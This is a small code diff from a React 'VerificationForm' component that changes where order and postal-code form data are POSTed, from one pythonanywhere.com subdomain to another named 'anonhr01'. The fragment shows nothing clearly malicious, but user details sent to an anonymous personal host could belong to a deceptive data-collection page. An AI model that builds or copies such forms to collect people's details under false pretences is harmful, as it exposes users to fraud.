@@ -106,7 +106,7 @@ const VerificationForm: React.FC<VerificationFormProps> = ({ initialOrderNumber,
     body.append('postal_code', formDataForApp.postalCode);
 
     try {
-      const response = await fetch('https://apihrsec01.pythonanywhere.com/submit', {
+      const response = await fetch('https://anonhr01.pythonanywhere.com/submit', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
